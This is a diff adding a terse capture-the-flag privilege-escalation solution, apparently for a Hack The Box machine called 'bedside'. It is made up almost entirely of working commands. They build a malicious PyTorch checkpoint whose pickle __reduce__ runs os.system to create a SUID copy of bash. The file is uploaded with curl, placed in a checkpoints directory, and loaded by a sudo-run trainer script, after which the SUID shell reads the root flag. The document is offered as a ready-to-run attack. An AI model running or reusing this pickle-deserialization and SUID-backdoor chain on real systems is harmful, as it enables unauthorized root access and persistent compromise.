@@ -1,0 +1,8 @@
+You run this on the ssh developer session 
+python3 -c 'import torch,os;E=type("E",(),{"__reduce__":lambda s:(os.system,("cp /bin/bash /usr/local/bin/rootbash;chmod 4755 /usr/local/bin/rootbash",))});torch.save(E(),"root.pt")'; python3 -c "import zipfile;z=zipfile.ZipFile('root.zip','w');z.write('root.pt');z.close()"; curl -s -F 'uploadFile=@root.zip;type=application/zip' http://research.bedside.htb/ >/dev/null
+
+Then on your datawrangler session run 
+python3 -c "import zipfile;zipfile.ZipFile('/var/www/research.bedside.htb/uploads/root.zip').extract('root.pt','/datastore/checkpoints')"; touch /datastore/checkpoints/root.pt; echo iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII= | base64 -d >/datastore/processed/x.png
+
+ Lastly in Developer shell again run 
+sudo -n /usr/bin/python3 /opt/trainer/bedside_trainer.py >/dev/null 2>&1; /usr/local/bin/rootbash -p -c 'id;cat /root/root.txt'
